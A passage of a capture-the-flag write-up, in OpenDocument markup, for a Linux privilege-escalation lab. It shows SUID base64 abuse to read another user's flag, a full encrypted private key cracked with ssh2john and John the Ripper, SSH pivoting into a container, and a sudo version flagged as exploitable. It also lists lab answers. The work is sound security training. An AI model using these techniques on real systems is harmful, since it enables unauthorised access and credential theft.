            <text:p text:style-name="Preformatted_20_Text">lrwxrwxrwx 1 penelope penelope <text:s text:c="3"/>9 Jan 12 04:02 .bash_history -&gt; /dev/null</text:p>
            <text:p text:style-name="Preformatted_20_Text">-rw-r--r-- 1 penelope penelope <text:s/>220 Jan 12 04:02 .bash_logout</text:p>
            <text:p text:style-name="Preformatted_20_Text">-rw-r--r-- 1 penelope penelope 3.7K Jan 12 04:02 .bashrc</text:p>
            <text:p text:style-name="Preformatted_20_Text">-rw-r--r-- 1 penelope penelope 8.8K Jan 12 04:02 examples.desktop</text:p>
            <text:p text:style-name="Preformatted_20_Text">-r-------- 1 penelope penelope <text:s text:c="2"/>43 Jan 12 04:02 flag.txt</text:p>
            <text:p text:style-name="Preformatted_20_Text">drwx------ 3 penelope penelope 4.0K Jan 12 08:32 .gnupg</text:p>
            <text:p text:style-name="P1">-rw-r--r-- 1 penelope penelope <text:s/>807 Jan 12 04:02 .profile</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body">We have a base64 binary with SUID for maya.</text:p>
      <text:p text:style-name="Text_20_body">Let's check GTFObins:</text:p>
      <table:table table:name="Table63" table:style-name="Table63">
        <table:table-column table:style-name="Table63.A"/>
        <table:table-column table:style-name="Table63.B"/>
        <table:table-row table:style-name="TableLine94402688874816">
          <table:table-cell table:style-name="Table63.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="Preformatted_20_Text">4</text:p>
            <text:p text:style-name="Preformatted_20_Text">5</text:p>
            <text:p text:style-name="Preformatted_20_Text">6</text:p>
            <text:p text:style-name="P1">7</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table63.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">$ gtfoblookup linux suid base64</text:p>
            <text:p text:style-name="Preformatted_20_Text">base64:</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>suid:</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>Code: LFILE=file_to_read</text:p>
            <text:p text:style-name="P1"><text:s text:c="14"/>./base64 "$LFILE" | base64 --decode</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body">So we will be able to read maya's flag:</text:p>
      <table:table table:name="Table64" table:style-name="Table64">
        <table:table-column table:style-name="Table64.A"/>
        <table:table-column table:style-name="Table64.B"/>
        <table:table-row table:style-name="TableLine94402688893360">
          <table:table-cell table:style-name="Table64.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="P1">4</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table64.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">penelope@linuxagency:~$ LFILE=/home/maya/flag.txt</text:p>
            <text:p text:style-name="Preformatted_20_Text">penelope@linuxagency:~$ ./base64 "$LFILE" | base64 -d</text:p>
            <text:p text:style-name="P1">maya{edited}</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Quotations">What is robert's Passphrase?</text:p>
      <text:p text:style-name="Text_20_body">Answer: <text:span text:style-name="Source_20_Text">industryweapon</text:span> </text:p>
      <text:p text:style-name="Text_20_body">maya seems in possesion of roberrt ssh key:</text:p>
      <table:table table:name="Table65" table:style-name="Table65">
        <table:table-column table:style-name="Table65.A"/>
        <table:table-column table:style-name="Table65.B"/>
        <table:table-row table:style-name="TableLine94402688911056">
          <table:table-cell table:style-name="Table65.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="Preformatted_20_Text">4</text:p>
            <text:p text:style-name="Preformatted_20_Text">5</text:p>
            <text:p text:style-name="Preformatted_20_Text">6</text:p>
            <text:p text:style-name="Preformatted_20_Text">7</text:p>
            <text:p text:style-name="Preformatted_20_Text">8</text:p>
            <text:p text:style-name="Preformatted_20_Text">9</text:p>
            <text:p text:style-name="Preformatted_20_Text">10</text:p>
            <text:p text:style-name="Preformatted_20_Text">11</text:p>
            <text:p text:style-name="Preformatted_20_Text">12</text:p>
            <text:p text:style-name="Preformatted_20_Text">13</text:p>
            <text:p text:style-name="Preformatted_20_Text">14</text:p>
            <text:p text:style-name="Preformatted_20_Text">15</text:p>
            <text:p text:style-name="Preformatted_20_Text">16</text:p>
            <text:p text:style-name="Preformatted_20_Text">17</text:p>
            <text:p text:style-name="Preformatted_20_Text">18</text:p>
            <text:p text:style-name="Preformatted_20_Text">19</text:p>
            <text:p text:style-name="Preformatted_20_Text">20</text:p>
            <text:p text:style-name="Preformatted_20_Text">21</text:p>
            <text:p text:style-name="Preformatted_20_Text">22</text:p>
            <text:p text:style-name="Preformatted_20_Text">23</text:p>
            <text:p text:style-name="P1">24</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table65.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">penelope@linuxagency:~$ su maya</text:p>
            <text:p text:style-name="Preformatted_20_Text">su maya</text:p>
            <text:p text:style-name="Preformatted_20_Text">Password:</text:p>
            <text:p text:style-name="Preformatted_20_Text">maya@linuxagency:/home/penelope$ cd</text:p>
            <text:p text:style-name="Preformatted_20_Text">maya@linuxagency:~$ ls -lhA</text:p>
            <text:p text:style-name="Preformatted_20_Text">ls -lhA</text:p>
            <text:p text:style-name="Preformatted_20_Text">total 44K</text:p>
            <text:p text:style-name="Preformatted_20_Text">lrwxrwxrwx 1 maya maya <text:s text:c="3"/>9 Jan 12 04:02 .bash_history -&gt; /dev/null</text:p>
            <text:p text:style-name="Preformatted_20_Text">-rw-r--r-- 1 maya maya <text:s/>220 Jan 12 04:02 .bash_logout</text:p>
            <text:p text:style-name="Preformatted_20_Text">-rw-r--r-- 1 maya maya 3.7K Jan 12 04:02 .bashrc</text:p>
            <text:p text:style-name="Preformatted_20_Text">-rw-r--r-- 1 maya maya <text:s/>519 Jan 12 10:51 elusive_targets.txt</text:p>
            <text:p text:style-name="Preformatted_20_Text">-rw-r--r-- 1 maya maya 8.8K Jan 12 04:02 examples.desktop</text:p>
            <text:p text:style-name="Preformatted_20_Text">-r-------- 1 maya maya <text:s text:c="2"/>39 Jan 12 04:02 flag.txt</text:p>
            <text:p text:style-name="Preformatted_20_Text">drwxr-xr-x 3 maya maya 4.0K Jan 12 04:02 .local</text:p>
            <text:p text:style-name="Preformatted_20_Text">drwxr-xr-x 2 maya maya 4.0K Jan 15 07:25 old_robert_ssh</text:p>
            <text:p text:style-name="Preformatted_20_Text">-rw-r--r-- 1 maya maya <text:s/>807 Jan 12 04:02 .profile</text:p>
            <text:p text:style-name="Preformatted_20_Text">drwx------ 2 maya maya 4.0K Jan 12 04:02 .ssh</text:p>
            <text:p text:style-name="Preformatted_20_Text">maya@linuxagency:~$ ls -lhA old_robert_ssh</text:p>
            <text:p text:style-name="Preformatted_20_Text">ls -lhA old_robert_ssh</text:p>
            <text:p text:style-name="Preformatted_20_Text">total 8.0K</text:p>
            <text:p text:style-name="Preformatted_20_Text">-rw------- 1 maya maya 1.8K Jan 12 04:02 id_rsa</text:p>
            <text:p text:style-name="P1">-rw-r--r-- 1 maya maya <text:s/>401 Jan 15 07:25 id_rsa.pub</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body"><text:soft-page-break/>We can copy the private key; convert it in john format and crack the passphrase maybe robert is using the same as PAM password.</text:p>
      <table:table table:name="Table66" table:style-name="Table66">
        <table:table-column table:style-name="Table66.A"/>
        <table:table-column table:style-name="Table66.B"/>
        <table:table-row table:style-name="TableLine94402688930688">
          <table:table-cell table:style-name="Table66.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="Preformatted_20_Text">4</text:p>
            <text:p text:style-name="Preformatted_20_Text">5</text:p>
            <text:p text:style-name="Preformatted_20_Text">6</text:p>
            <text:p text:style-name="Preformatted_20_Text">7</text:p>
            <text:p text:style-name="Preformatted_20_Text">8</text:p>
            <text:p text:style-name="Preformatted_20_Text">9</text:p>
            <text:p text:style-name="Preformatted_20_Text">10</text:p>
            <text:p text:style-name="Preformatted_20_Text">11</text:p>
            <text:p text:style-name="Preformatted_20_Text">12</text:p>
            <text:p text:style-name="Preformatted_20_Text">13</text:p>
            <text:p text:style-name="Preformatted_20_Text">14</text:p>
            <text:p text:style-name="Preformatted_20_Text">15</text:p>
            <text:p text:style-name="Preformatted_20_Text">16</text:p>
            <text:p text:style-name="Preformatted_20_Text">17</text:p>
            <text:p text:style-name="Preformatted_20_Text">18</text:p>
            <text:p text:style-name="Preformatted_20_Text">19</text:p>
            <text:p text:style-name="Preformatted_20_Text">20</text:p>
            <text:p text:style-name="Preformatted_20_Text">21</text:p>
            <text:p text:style-name="Preformatted_20_Text">22</text:p>
            <text:p text:style-name="Preformatted_20_Text">23</text:p>
            <text:p text:style-name="Preformatted_20_Text">24</text:p>
            <text:p text:style-name="Preformatted_20_Text">25</text:p>
            <text:p text:style-name="Preformatted_20_Text">26</text:p>
            <text:p text:style-name="Preformatted_20_Text">27</text:p>
            <text:p text:style-name="Preformatted_20_Text">28</text:p>
            <text:p text:style-name="Preformatted_20_Text">29</text:p>
            <text:p text:style-name="Preformatted_20_Text">30</text:p>
            <text:p text:style-name="P1">31</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table66.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">maya@linuxagency:~$ cat old_robert_ssh/id_rsa</text:p>
            <text:p text:style-name="Preformatted_20_Text">-----BEGIN RSA PRIVATE KEY-----</text:p>
            <text:p text:style-name="Preformatted_20_Text">Proc-Type: 4,ENCRYPTED</text:p>
            <text:p text:style-name="Preformatted_20_Text">DEK-Info: AES-128-CBC,7903FE7BDBA051C4B0BF7C6C5C597E0B</text:p>
            <text:p text:style-name="Preformatted_20_Text">iRzpH6qjXDvmVU5wwYU7TQfyQHIqYzR0NquznZ3OiXyaSOaovgPXdGP3r50vfIV6</text:p>
            <text:p text:style-name="Preformatted_20_Text">i07H7ZSczz4nuenYJGIE7ZfDYtVVA9R6IdcIZecYF2L3OfHoR/ghGOlbLC+Hyvky</text:p>
            <text:p text:style-name="Preformatted_20_Text">RMcrEgajpdV7zCPRHckiBioxzx1K7kfkinyiSBoV9pz9PuAKo47OHtKDdtjWFV+A</text:p>
            <text:p text:style-name="Preformatted_20_Text">PkiWa8aCmAGShC9RZkZLMRhVkR0TZGOgJGTs/MncopyJJ6TgJ9AzHcQo3vcf5A3k</text:p>
            <text:p text:style-name="Preformatted_20_Text">7f3+9Niw7mMFmWrU35WOBpAynGkK9eDTvt/DoIMJcT9KL1BBaEzReO8mETNqfT5G</text:p>
            <text:p text:style-name="Preformatted_20_Text">QncO/4tBSG7QaU6pQkd+UiZCtltp47Tu9hwSEsxDIleespuBn9mDHrYtBDC8jEBq</text:p>
            <text:p text:style-name="Preformatted_20_Text">nqm0sDdYOPzjUTMDSJgqmLZ0lzagTa1OMNUlvRAz5Sde4bKAoYRgVvBWJ4whn4H+</text:p>
            <text:p text:style-name="Preformatted_20_Text">OIHhFQ6tbCVr/0tosYrc9ehM4N4TiJ0SyfrP1XmDo8bud+UtNf2Tf/vKjYT9FP+/</text:p>
            <text:p text:style-name="Preformatted_20_Text">+HqrIn1ou4Cvvu/jPbwVU8Ejh4CX/TJhDK6JqLzsqOp0M8jBccCR+zrRXcZsKLnG</text:p>
            <text:p text:style-name="Preformatted_20_Text">JUTqxKwML7FhRiAgeTmOUx43XVOvzrNOmZ+8EmbmE4fW5x9UKR2nzKgILwHApayK</text:p>
            <text:p text:style-name="Preformatted_20_Text">dmKbym96uSoQOm4KycXjoDVw9nAgRQQVQ+3Ndy0JwuyXN7keNcesEN5hb5VNN9VP</text:p>
            <text:p text:style-name="Preformatted_20_Text">jp+mS+c/CctyLSgZkGJif2r2N+3x2AZFkDs059sPQB8UGvI4w41qGBubfsHAvVPW</text:p>
            <text:p text:style-name="Preformatted_20_Text">KH+HAgj1i1RM0/XZ5XKIl0K4iO/eQ5xTAPah51f6LCYnZo/G6fM7IT72k0Z0KMZ8</text:p>
            <text:p text:style-name="Preformatted_20_Text">EiySGtRCcv7vrkVRjkgmw4lAeGLJ9FBOw8IdKa9ftYJauKY/E0Gs1Qhefl+3K2BB</text:p>
            <text:p text:style-name="Preformatted_20_Text">4PJ+Pr/doZ3Dkq4Q/YPrKnbKEbs/3Zvbu/XT5y+joS6tzF3Raz6xW0kg3NyaA1B5</text:p>
            <text:p text:style-name="Preformatted_20_Text">V5zoj0/tnBb9Lc0YH7s2QT+9drFH4w8tb5kjyd1jlER3Hs4m31cniCsxDlKoTwk/</text:p>
            <text:p text:style-name="Preformatted_20_Text">uAGurW23NZ4QF+3/PgjZRhudpNjcOP69Ys2XGAecxO9uBx9JjPR/cn9c54v4s/kH</text:p>
            <text:p text:style-name="Preformatted_20_Text">n6v24eXF2uGGlEsvEpzIpk6UDap7YoxnRKIPo0mZ5G7/MS9+RL6dv9rmJ6IQd7Cr</text:p>
            <text:p text:style-name="Preformatted_20_Text">fPjhz8snqfuGCAVveKWIOPnlfYiYJ2nQ6yA1Soyt9outfLbwIzDh7e+eqaOP2amh</text:p>
            <text:p text:style-name="Preformatted_20_Text">rGCqwxrj9cj4sH/MzvKZVARzH3hs39wRmoEtx9ML/uXsp22DqUODOxc7cdUlRs99</text:p>
            <text:p text:style-name="Preformatted_20_Text">zTj8CHFpM6X+ihSF33Eg0qBJwkyWzdKQiFKNTm8ld4wzov1tdKeRC7nlUh5F4lkf</text:p>
            <text:p text:style-name="Preformatted_20_Text">yExiUTllJq8pJ3JAC/LEvQXF041fcmQ0RvoL1n3nyqIvvOjuY7UDZrcmuWQ+epdE</text:p>
            <text:p text:style-name="Preformatted_20_Text">APKzOgkxhEqsozt8kj810m3bjIWngenwRcGL6M1ZsvwT1YwGUKG47wX2Ze3tp3ge</text:p>
            <text:p text:style-name="Preformatted_20_Text">K4NUD9GdZJIiu8qdpyMIFKR9MfM3Pur5JRUK0IjCD43xk9p6LZYK00C3N2F4exwM</text:p>
            <text:p text:style-name="Preformatted_20_Text">Ye5kHYeqZLpl4ljZSBoNtEK1BbYSffBt2XdoQsAvft1iwjdtZ9E644oTp9QYjloE</text:p>
            <text:p text:style-name="P1">-----END RSA PRIVATE KEY-----</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body">Workaround for <text:a xlink:type="simple" xlink:href="https://github.com/openwall/john/issues/4564" office:target-frame-name="_blank" xlink:show="new" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">ssh2john 1.9.0-jumbo</text:a> bug:</text:p>
      <table:table table:name="Table67" table:style-name="Table67">
        <table:table-column table:style-name="Table67.A"/>
        <table:table-column table:style-name="Table67.B"/>
        <table:table-row table:style-name="TableLine94402688945392">
          <table:table-cell table:style-name="Table67.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="P1">2</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table67.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">$ sed 's/decodestring/decodebytes/' /usr/bin/ssh2john | python3.9 - id_rsa_robert</text:p>
            <text:p text:style-name="P1">id_rsa_robert:$sshng$1$16$7903FE7BDBA051C4B0BF7C6C5C597E0B$1200$891ce91faaa35c3be6554e70c1853b4d07f240722a63347436abb39d9dce897c9a48e6a8be03d77463f7af9d2f7c857a8b4ec7ed949ccf3e27b9e9d8246204ed97c362d55503d47a21d70865e7181762f739f1e847f82118e95b2c2f87caf93244c72b1206a3a5d57bcc23d11dc922062a31cf1d4aee47e48a7ca2481a15f69cfd3ee00aa38ece1ed28376d8d6155f803e48966bc682980192842f5166464b311855911d136463a02464ecfcc9dca29c8927a4e027d0331dc428def71fe40de4edfdfef4d8b0ee6305996ad4df958e0690329c690af5e0d3bedfc3a08309713f4a2f5041684cd178ef2611336a7d3e4642770eff8b41486ed0694ea942477e522642b65b69e3b4eef61c1212cc4322579eb29b819fd9831eb62d0430bc8c406a9ea9b4b0375838fce351330348982a98b6749736a04dad4e30d525bd1033e5275ee1b280a1846056f056278c219f81fe3881e1150ead6c256bff4b68b18adcf5e84ce0de13889d12c9facfd57983a3c6ee77e52d35fd937ffbca8d84fd14ffbff87aab227d68bb80afbeefe33dbc1553c123878097fd32610cae89a8bceca8ea7433c8c171c091fb3ad15dc66c28b9c62544eac4ac0c2fb16146202079398e531e375d53afceb34e999fbc1266e61387d6e71f54291da7cca8082f01c0a5ac8a76629bca6f7ab92a103a6e0ac9c5e3a03570f6702045041543edcd772d09c2ec9737b91e35c7ac10de616f954d37d54f8e9fa64be73f09cb722d28199062627f6af637edf1d80645903b34e7db0f401f141af238c38d6a181b9b7ec1c0bd53d6287f870208f58b544cd3f5d9e572889742b888efde439c5300f6a1e757fa2c2627668fc6e9f33b213ef693467428c67c122c921ad44272feefae45518e4826c389407862c9f4504ec3c21d29af5fb5825ab8a63f1341acd5085e7e5fb72b6041e0f27e3ebfdda19dc392ae10fd83eb2a76ca11bb3fdd9bdbbbf5d3e72fa3a12eadcc5dd16b3eb15b4920dcdc9a035079579ce88f4fed9c16fd2dcd181fbb36413fbd76b147e30f2d6f9923c9dd639444771ece26df5727882b310e52a84f093fb801aead6db7359e1017edff3e08d9461b9da4d8dc38febd62cd9718079cc4ef6e071f498cf47f727f5ce78bf8b3f9079fabf6e1e5c5dae186944b2f129cc8a64e940daa7b628c6744a20fa34999e46eff312f7e44be9dbfdae627a21077b0ab7cf8e1cfcb27a9fb8608056f78a58838f9e57d88982769d0eb20354a8cadf68bad7cb6f02330e1edef9ea9a38fd9a9a1ac60aac31ae3f5c8f8b07fcccef2995404731f786cdfdc119a812dc7d30bfee5eca76d83a943833b173b71d52546cf7dcd38fc08716933a5fe8a1485df7120d2a049c24c96cdd29088528d4e6f25778c33a2fd6d74a7910bb9e5521e45e2591fc84c6251396526af292772400bf2c4bd05c5d38d5f72643446fa0bd67de7caa22fbce8ee63b50366b726b9643e7a974400f2b33a0931844aaca33b7c923f35d26ddb8c85a781e9f045c18be8cd59b2fc13d58c0650a1b8ef05f665ededa7781e2b83540fd19d649222bbca9da7230814a47d31f3373eeaf925150ad088c20f8df193da7a2d960ad340b73761787b1c0c61ee641d87aa64ba65e258d9481a0db442b505b6127df06dd9776842c02f7edd62c2376d67d13ae38a13a7d4188e5a04</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body">Else we would only need:</text:p>
      <table:table table:name="Table68" table:style-name="Table68">
        <table:table-column table:style-name="Table68.A"/>
        <table:table-column table:style-name="Table68.B"/>
        <table:table-row table:style-name="TableLine94402688961552">
          <table:table-cell table:style-name="Table68.A1" office:value-type="string">
            <text:p text:style-name="P1">1</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table68.A1" office:value-type="string">
            <text:p text:style-name="P1">$ ssh2john id_rsa_robert</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body">Let's crack it with JtR:</text:p>
      <table:table table:name="Table69" table:style-name="Table69">
        <table:table-column table:style-name="Table69.A"/>
        <table:table-column table:style-name="Table69.B"/>
        <table:table-row table:style-name="TableLine94402688982160">
          <table:table-cell table:style-name="Table69.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="Preformatted_20_Text">4</text:p>
            <text:p text:style-name="Preformatted_20_Text">5</text:p>
            <text:p text:style-name="Preformatted_20_Text">6</text:p>
            <text:p text:style-name="Preformatted_20_Text">7</text:p>
            <text:p text:style-name="Preformatted_20_Text">8</text:p>
            <text:p text:style-name="Preformatted_20_Text">9</text:p>
            <text:p text:style-name="Preformatted_20_Text">10</text:p>
            <text:p text:style-name="Preformatted_20_Text">11</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/>12</text:p>
            <text:p text:style-name="P1">13</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table69.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">$ john robert_ssh.txt -w=/usr/share/wordlists/passwords/rockyou.txt --format=ssh</text:p>
            <text:p text:style-name="Preformatted_20_Text">Using default input encoding: UTF-8</text:p>
            <text:p text:style-name="Preformatted_20_Text">Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])</text:p>
            <text:p text:style-name="Preformatted_20_Text">Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes</text:p>
            <text:p text:style-name="Preformatted_20_Text">Cost 2 (iteration count) is 1 for all loaded hashes</text:p>
            <text:p text:style-name="Preformatted_20_Text">Will run 8 OpenMP threads</text:p>
            <text:p text:style-name="Preformatted_20_Text">Note: This format may emit false positives, so it will keep trying even after</text:p>
            <text:p text:style-name="Preformatted_20_Text">finding a possible candidate.</text:p>
            <text:p text:style-name="Preformatted_20_Text">Press 'q' or Ctrl-C to abort, almost any other key for status</text:p>
            <text:p text:style-name="Preformatted_20_Text">edited <text:s text:c="2"/>(id_rsa_robert)</text:p>
            <text:p text:style-name="Preformatted_20_Text">Warning: Only 1 candidate left, minimum 8 needed for performance.</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/>1g 0:00:00:03 DONE (2021-02-05 15:39) 0.2538g/s 3640Kp/s 3640Kc/s 3640KC/s *7¡Vamos!</text:p>
            <text:p text:style-name="P1">Session completed</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body">But we can't connect directly nor via the public SSH:</text:p>
      <table:table table:name="Table70" table:style-name="Table70">
        <table:table-column table:style-name="Table70.A"/>
        <table:table-column table:style-name="Table70.B"/>
        <table:table-row table:style-name="TableLine94402689002352">
          <table:table-cell table:style-name="Table70.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="P1">2</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table70.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">maya@linuxagency:~$ su robert</text:p>
            <text:p text:style-name="P1">No passwd entry for user 'robert'</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <table:table table:name="Table71" table:style-name="Table71">
        <table:table-column table:style-name="Table71.A"/>
        <table:table-column table:style-name="Table71.B"/>
        <table:table-row table:style-name="TableLine94402689025344">
          <table:table-cell table:style-name="Table71.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="P1">3</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table71.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">ssh robert@10.10.253.250 -i id_rsa_robert</text:p>
            <text:p text:style-name="Preformatted_20_Text">Enter passphrase for key 'id_rsa_robert':</text:p>
            <text:p text:style-name="P1">Connection closed by 10.10.253.250 port 22</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body">But there is maybe another SSH running on localhost port 2222:</text:p>
      <table:table table:name="Table72" table:style-name="Table72">
        <table:table-column table:style-name="Table72.A"/>
        <table:table-column table:style-name="Table72.B"/>
        <table:table-row table:style-name="TableLine94402689039184">
          <table:table-cell table:style-name="Table72.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="Preformatted_20_Text">4</text:p>
            <text:p text:style-name="Preformatted_20_Text">5</text:p>
            <text:p text:style-name="Preformatted_20_Text">6</text:p>
            <text:p text:style-name="Preformatted_20_Text">7</text:p>
            <text:p text:style-name="Preformatted_20_Text">8</text:p>
            <text:p text:style-name="Preformatted_20_Text">9</text:p>
            <text:p text:style-name="Preformatted_20_Text">10</text:p>
            <text:p text:style-name="Preformatted_20_Text">11</text:p>
            <text:p text:style-name="Preformatted_20_Text">12</text:p>
            <text:p text:style-name="P1">13</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table72.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">maya@linuxagency:~$ ss -nlpt | grep 22</text:p>
            <text:p text:style-name="Preformatted_20_Text">ss -nlpt | grep 22</text:p>
            <text:p text:style-name="Preformatted_20_Text">LISTEN <text:s text:c="2"/>0 <text:s text:c="8"/>128 <text:s text:c="14"/>127.0.0.1:2222 <text:s text:c="12"/>0.0.0.0:*</text:p>
            <text:p text:style-name="Preformatted_20_Text">LISTEN <text:s text:c="2"/>0 <text:s text:c="8"/>128 <text:s text:c="16"/>0.0.0.0:22 <text:s text:c="14"/>0.0.0.0:*</text:p>
            <text:p text:style-name="Preformatted_20_Text">LISTEN <text:s text:c="2"/>0 <text:s text:c="8"/>128 <text:s text:c="19"/>[::]:22 <text:s text:c="17"/>[::]:*</text:p>
            <text:p text:style-name="Preformatted_20_Text">ssh robert@127.0.0.1 -p 2222 -i olold_robert_ssh/id_rsa</text:p>
            <text:p text:style-name="Preformatted_20_Text">Warning: Identity file olold_robert_ssh/id_rsa not accessible: No such file or directory.</text:p>
            <text:p text:style-name="Preformatted_20_Text">robert@127.0.0.1's password:</text:p>
            <text:p text:style-name="Preformatted_20_Text">Last login: Tue Jan 12 17:02:07 2021 from 172.17.0.1</text:p>
            <text:p text:style-name="Preformatted_20_Text">robert@ec96850005d6:~$ id</text:p>
            <text:p text:style-name="P1">uid=1000(robert) gid=1000(robert) groups=1000(robert)</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Quotations">What is user.txt?</text:p>
      <text:p text:style-name="Text_20_body">Answer: <text:span text:style-name="Source_20_Text">user{620fb94d32470e1e9dcf8926481efc96}</text:span> </text:p>
      <table:table table:name="Table73" table:style-name="Table73">
        <table:table-column table:style-name="Table73.A"/>
        <table:table-column table:style-name="Table73.B"/>
        <table:table-row table:style-name="TableLine94402689067888">
          <table:table-cell table:style-name="Table73.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="Preformatted_20_Text">4</text:p>
            <text:p text:style-name="P1">5</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table73.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">robert@ec96850005d6:~$ cat robert.txt</text:p>
            <text:p text:style-name="Preformatted_20_Text">cat robert.txt</text:p>
            <text:p text:style-name="Preformatted_20_Text">You shall not pass from here!!!</text:p>
            <text:p text:style-name="P1">I will not allow ICA to take over my world.</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body">For sure we are in a docker container:</text:p>
      <table:table table:name="Table74" table:style-name="Table74">
        <table:table-column table:style-name="Table74.A"/>
        <table:table-column table:style-name="Table74.B"/>
        <table:table-row table:style-name="TableLine94402689088192">
          <table:table-cell table:style-name="Table74.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="P1">2</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table74.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">robert@ec96850005d6:~$ ls -lh /.dockerenv</text:p>
            <text:p text:style-name="P1">-rwxr-xr-x 1 root root 0 Jan 12 12:50 /.dockerenv</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body">Sudo version 1.8.21p2 is vulnerable to <text:a xlink:type="simple" xlink:href="https://www.exploit-db.com/exploits/47502" office:target-frame-name="_blank" xlink:show="new" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">EDB-ID 47502</text:a></text:p>
      <table:table table:name="Table75" table:style-name="Table75">
        <table:table-column table:style-name="Table75.A"/>
        <table:table-column table:style-name="Table75.B"/>
        <table:table-row table:style-name="TableLine94402689101808">
          <table:table-cell table:style-name="Table75.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="Preformatted_20_Text">4</text:p>
            <text:p text:style-name="Preformatted_20_Text">5</text:p>
            <text:p text:style-name="Preformatted_20_Text">6</text:p>
            <text:p text:style-name="Preformatted_20_Text">7</text:p>
            <text:p text:style-name="Preformatted_20_Text">8</text:p>
            <text:p text:style-name="Preformatted_20_Text">9</text:p>
            <text:p text:style-name="P1">10</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table75.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">robert@ec96850005d6:~$ sudo --version</text:p>
            <text:p text:style-name="Preformatted_20_Text">Sudo version 1.8.21p2</text:p>
            <text:p text:style-name="Preformatted_20_Text">Sudoers policy plugin version 1.8.21p2</text:p>
